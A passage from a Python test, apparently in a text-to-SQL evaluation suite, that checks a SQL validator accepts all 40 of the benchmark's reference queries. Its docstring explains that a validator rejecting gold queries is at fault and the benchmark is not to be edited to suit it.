    score on hostile input by rejecting everything, and nothing else in this
    file would notice. The 40 reference queries are the standard it has to meet
    — correlated subqueries, a `UNION`, a window function over a derived table,
    `CASE`, `DISTINCT` inside an aggregate, a four-table join, a scalar subquery
    inside `HAVING`.

    **A gold query this gate rejects is a Gate 2 defect, not a broken
    question.** Fix the validator; do not edit the benchmark to suit it.

    Needs no database — the dataset is a file, and validation is pure.
    """
    from evals.dataset import load_dataset

    rejected = [
        f"{question.id}: {validate_sql(question.gold_sql)[1]}"
        for question in load_dataset().questions
        if not validate_sql(question.gold_sql)[0]
    ]

    assert not rejected, (
        "Gate 2 rejected reference queries the benchmark depends on. Per AC19 "
        "the gate is wrong, not the benchmark:\n" + "\n".join(rejected)
    )
